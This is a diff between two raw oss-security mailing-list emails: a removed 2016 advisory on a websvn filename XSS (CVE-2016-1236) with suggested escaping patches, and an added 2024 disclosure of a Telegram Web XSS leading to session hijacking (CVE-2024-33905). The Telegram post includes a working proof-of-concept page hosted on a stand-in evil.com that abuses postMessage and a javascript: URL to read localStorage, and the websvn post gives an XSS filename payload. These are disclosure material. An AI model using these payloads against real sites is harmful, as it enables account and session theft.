@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2314" "Friday" "6" "May" "2016" "00:18:24" "+0530" "Nitin Venkatesh" "venkatesh.nitin@gmail.com" "<CAARZ5vpwcDbDCynB-8RUGZ07PodZF9hd2ctVddYG97+xaEiCbw@mail.gmail.com>" "70" "[oss-security] CVE-2016-1236 - XSS Vulnerability in websvn 2.3.3-1.2+deb8u1" nil nil nil "5" "2016050518:48:24" "[oss-security] CVE-2016-1236 - XSS Vulnerability in websvn 2.3.3-1.2+deb8u1" (number mark "U       venkatesh.ni May  6   70/2314  " thread-indent "\"[oss-security] CVE-2016-1236 - XSS Vulnerability in websvn 2.3.3-1.2+deb8u1\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 14310 invoked by uid 550); 5 May 2016 18:48:37 -0000
+Received: (qmail 22523 invoked by uid 550); 30 Apr 2024 10:14:14 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,105 +7,141 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 14291 invoked from network); 5 May 2016 18:48:37 -0000
+Received: (qmail 14015 invoked from network); 30 Apr 2024 09:30:30 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=mime-version:date:message-id:subject:from:to;
-        bh=kPZayqGl1jUDmohS3xhxJeMCkKsn1xMFFLz82RgHJV4=;
-        b=YIQPRCAonwBPDKfO18SP8/THd2mTB8sAgG2u/cvJ9ghuQHBwGAREcAI7HjufCat7ml
-         nSNK7GJLeTOT3laxfP4OLEROhhboKiDHUAFvF8FHBE8z5oqOKmlL3UZqstlywXxb2Uvt
-         X15RzMYl7npGbxm0aRbg804neEh1/+wfjhIg8xPqZ3lk5hhyGBwLFWruX6tu+N9J1viV
-         jSHjHu8w47hf9GHHSTMh2rSzY7jZJgXDuLaqtbW6Y/GMElGQUXpzrbYvznDQfFTWU5xU
-         5XOY7v3Jg34RpyikjrRKDkKGhdvLpMXpSFrZZay7b11HSH8cLuF4YMRZHaG3Q6teHgie
-         sxbQ==
+        d=gmail.com; s=20230601; t=1714469421; x=1715074221; darn=lists.openwall.com;
+        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=H9chNwYP8QLlBwFOFEElq/CGUpdR0F3PakX9DJ5RpZI=;
+        b=KtkgtTzsEk0RwW3W5nUwWb9HLKv++hIxIUMiRBJMG9SstLf4+4LGkOuZtIgzry7KMT
+         k0jBwozviQc6rA8wZJmzq6ZcUx0vo4IUfMNDZsJL+9CESCqdk/M3NYrSjtmEy5Eqz1Pq
+         lCGJKTXVuG4uVVNjTtKa6YUBisU7/km9mTTPu4r+txe4UKY1q7l9sEBRxeC5Hn7qz4wm
+         NrmF+ITAtYrvj7yjScdGyF2Z+zauPr9DFbeu//mbWHi6ESmLFDYy7Ibc+mM+RUOhahkn
+         Sr74+aTNfmaL7gSVUY+bDLg+TLPY85OK/PsknRbDN+aeWfdXgZ9YCaxMtmVVQJ3qn+XO
+         LcLQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:date:message-id:subject:from:to;
-        bh=kPZayqGl1jUDmohS3xhxJeMCkKsn1xMFFLz82RgHJV4=;
-        b=k3rQzpYC1SNJ/P215VisnXI+vr+7MOmEoU8IPluzebwV1TkZhjIX+33DJQFkqDvgc8
-         4LNsAHj4pKzDVWS4+oQnRb9xl1nHWENpJ3xsOmV14oUdcxwo3Hf74m2xBPOa2as/Xsyn
-         L8369Mq2Kf6d0zd6SyE+c0s07zNo5/aoGZ7WbSd5Ekc22FSn+uunY10JfzPy+kGLeHZL
-         N7MIhfN3mXtFH+4w1fmYHe/IXe/UwX+lSFMwZGSDld0ACc0QnPayMfErISnDOcRJTieF
-         xMwXBWGEO7U1xOeNJhqeaH/j+U3J+2ESgrJgxUqRd7reRCygRf/9l93dDrKrzS2gcLw5
-         fuEA==
-X-Gm-Message-State: AOPr4FX56zxOhGHQ0gh8+AZOQULQ1ryu/E368fSOF0CzvhA3d51oZuiqcaR0M63g0EWt6eKRe12SHzP2QhtM0w==
+        d=1e100.net; s=20230601; t=1714469421; x=1715074221;
+        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
+        bh=H9chNwYP8QLlBwFOFEElq/CGUpdR0F3PakX9DJ5RpZI=;
+        b=mADlc/TEnivLBkV3fowbb1TEiq0LVm0o/sJWgTabVukbcwxU1W+ZGqBFEq2cs36h4t
+         gpNr7E/MAYs9tZnb/TUrdqwxEoXbWlswJPlCgLTDeXjOxt1Gxwldy8CxnZ0zZ69wX7te
+         ftW90pKkLmpMKcVYgopbdRF55i5FlrzMMXlgwp0/Ueah2ML1T/5j1bshPX6ybmOJXZJJ
+         t/7dU0740HdYqoLDC78q7QniLb0+APx0pzb+m6Ph444xyiMbtGS/BVgaARMAgWZEzXmB
+         9GNFvY9IWYFUuh84CnaY8c95gNqN8H96Mna4+GbApjKLtpeeW+qy5rRN7/NI4AfPQLe+
+         CEmw==
+X-Gm-Message-State: AOJu0Yy67/VojF1vqV0mKQEnpfavS2/P6wk3tXOw0Zcp8+gc4BdPBjfK
+	/JTKNVnQCcfDthkvTrLqbgiaHPWMbbmgEjyqzsE77uQcpHbqSsIKGHaKYCA16xwITF33Qjo4cqY
+	1scnBsn2S33oXjCelgN0OEKd9wazdpr9T
+X-Google-Smtp-Source: AGHT+IEYbS2e8J9HYiEVwfal/VtMuf6188Nkq2EQIlnI6B21M/kTijP8Xq2EPzCLHQKIwg5cc+97UlfOh6gqkJlhZCY=
+X-Received: by 2002:a17:907:987:b0:a58:c09d:199d with SMTP id
+ bf7-20020a170907098700b00a58c09d199dmr10332897ejc.73.1714469420810; Tue, 30
+ Apr 2024 02:30:20 -0700 (PDT)
 MIME-Version: 1.0
-X-Received: by 10.107.152.85 with SMTP id a82mr18160091ioe.46.1462474104147;
- Thu, 05 May 2016 11:48:24 -0700 (PDT)
-Date: Fri, 6 May 2016 00:18:24 +0530
-Message-ID: <CAARZ5vpwcDbDCynB-8RUGZ07PodZF9hd2ctVddYG97+xaEiCbw@mail.gmail.com>
-From: Nitin Venkatesh <venkatesh.nitin@gmail.com>
+References: <CAD44bnPA-_1PRL2SqwvFssSo6MAN4wMkRMXwhy0XmJwrWGPxaQ@mail.gmail.com>
+In-Reply-To: <CAD44bnPA-_1PRL2SqwvFssSo6MAN4wMkRMXwhy0XmJwrWGPxaQ@mail.gmail.com>
+From: Pedro Batista <pedbap.g@gmail.com>
+Date: Tue, 30 Apr 2024 11:30:09 +0200
+Message-ID: <CAD44bnO8ggssLh-DcW4Hm0FOAOWjNm0-0NWAzca7f_oKOrAyrA@mail.gmail.com>
 To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary=001a114079ae78f37305321cc906
-Subject: [oss-security] CVE-2016-1236 - XSS Vulnerability in websvn 2.3.3-1.2+deb8u1
+Content-Type: multipart/alternative; boundary="000000000000ce490006174d049d"
+Subject: [oss-security] Re: Telegram Web app XSS / Session Hijacking 1-click
 
---001a114079ae78f37305321cc906
-Content-Type: text/plain; charset=UTF-8
+--000000000000ce490006174d049d
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-# Summary:
-Vulnerability Type: Cross-site Scripting (XSS)
-Package: websvn
-Version: 2.3.3-1.2+deb8u1
-CVE: CVE-2016-1236
+CVE-2024-33905
 
-# Description:
-Having a directory or file in a repository with its filename containing a
-XSS payload will cause it to be executed in various parts of the
-application.
+On Sun, Apr 28, 2024 at 5:59=E2=80=AFPM Pedro Batista <pedbap.g@gmail.com> =
+wrote:
 
-# Steps to reproduce the issue:
-1. Clone a SVN repo that websvn has access to
-2. Create a directory/file with its filename containing the XSS payload,
-for example, "><img src=x onerror=alert(1)>
-3. Add and commit the changes (new directory/file).
-4. The payload is executed, when browsing the repository using websvn in
-the browser.
+> Hi oss-security,
+> I would like to share a vulnerability I reported on Telegram Web
+> application which is Open Source (https://github.com/morethanwords/tweb).
+> The vulnerability is a XSS that can be exploited to achieve session
+> hijacking with 1-click using Telegram Mini Apps.
+>
+> I reported the vulnerability on March 9th, 2024 and Telegram promptly
+> fixed it on March 11th, 2024.
+>
+> # Vulnerable version: Telegram WebK 2.0.0 (486) and below
+> # Fixed version: Telegram WebK 2.0.0 (488)
+>
+> # Attack Surface
+> ## Telegram Mini Apps
+> =E2=80=9CTelegram Mini Apps are essentially web applications that you can=
+ run
+> directly within the Telegram messenger interface. Mini Apps support
+> seamless authorization, integrated crypto and fiat payments (via Google P=
+ay
+> and Apple Pay), tailored push notifications, and more.=E2=80=9D
+>
+> > https://core.telegram.org/bots/webapps
+> > https://ton.org/mini-apps
+>
+> Is important to highlight that this feature is heavily used for crypto
+> payments in the TON Blockchain.
+>
+> # Static Analysis
+> A cached version of the vulnerable file can be found here:
+> - https://web.telegram.org/k/appDialogsManager-aLs9GOvc.js
+>
+> ```
+> telegramWebView.addMultipleEventsListeners({
+>        // [...]
+>        web_app_open_link:({url:t})=3D>{window.open(t,"_blank")}
+> }
+> ```
+> The vulnerability was triggered with `postMessage` communication by
+> abusing the event `web_app_open_link` which allowed a new URL to remain
+> with the javascript context of the parent window using the `javascript:`
+> scheme as XSS payload.
+>
+> # Weaponized Setup
+> 1. Attacker creates a Bot + Mini App
+> 2. Sets the URL of the Mini App =3D> https://evil.com/homepage.html
+> 3. The exploit will be hosted in the homepage of the attacker=E2=80=99s s=
+ite
+> 3.1. homepage.html
+> ```
+> <body onload=3Dexploit()>
+>  <script>
+> function exploit() {
+>  window.parent.postMessage(JSON.stringify({eventType: 'web_app_open_link',
+> eventData: {url:
+> "javascript:alert(JSON.stringify(window.parent.localStorage))"}}), '*'); }
+>  </script>
+> </body>
+> ```
+>
+> # Telegram Patch Commit
+>
+> https://github.com/morethanwords/tweb/commit/2153ea9878668769faac8dd5931b=
+7e0b96a9f129/src/components/popups/webApp.ts
+>
+> ```
+> export default function
+> safeWindowOpen(url: string) {
+>     window.open(url, '_blank', 'noreferrer');
+> }
+> ```
+>
+> # Demo
+> I have published a writeup for this finding which includes the Exploit
+> Demo, it's available here:
+>
+>
+> https://medium.com/@pedbap/telegram-web-app-xss-session-hijacking-1-click=
+-95acccdc8d90
+>
+> I recently requested a CVE for this vulnerability as well, looking forward
+> to updating the thread as soon as it is issued.
+>
+> Thanks for looking into my report.
+>
+> Best regards,
+> Pedro Baptista
+>
 
-# Suggested Patches:
-Please use at your own discretion, the following patches might not solve
-the issue entirely.
-The escape() function used in the suggested patch was written by the
-original developer and can be found in the include/command.php file.
-
-revision.php - Modified
-L148:
-+ 'path' => escape($change->path)
-- 'path' => $change->path,
-
-log.php - Added
-L326-328:
-+ $listing[$index]['revadded'] = escape($listing[$index]['revadded']);
-+ $listing[$index]['revdeleted'] = escape($listing[$index]['revdeleted']);
-+ $listing[$index]['revmodified'] = escape($listing[$index]['revmodified']);
-
-listing.php - Modified
-L126:
-+ $listing[$index]['filename'] = escape($file);
-- $listing[$index]['filename'] = $file;
-
-L140:
-+ $listing[$index]['compare_box'] = '<input type="checkbox"
-name="compare[]" value="'.escape($path.$file).'@'.$passrev.'"
-onclick="checkCB(this)" />';
-- $listing[$index]['compare_box'] = '<input type="checkbox"
-name="compare[]" value="'.$path.$file.'@'.$passrev.'"
-onclick="checkCB(this)" />';
-
-comp.php - Modified
-L384:
-+ $listing[$index]['newpath'] = escape($absnode);
-- $listing[$index]['newpath'] = $absnode;
-
-# Events Timeline:
-2016-04-29 - Discovered vulnerability
-2016-04-29 - Reported to Debian Security Team
-2016-04-30 - Acknowledgement received from Debian Security Team
-2016-05-01 - CVE-2016-1236 assigned to the issue
-2016-05-05 - Disclosing issue on oss-sec mailing list as advised
-
-# Disclaimer:
-Please use the information presented above responsibly, at your own
-discretion. I will in no way be responsible for how this information is
-used or misused.
-
---001a114079ae78f37305321cc906--
+--000000000000ce490006174d049d--
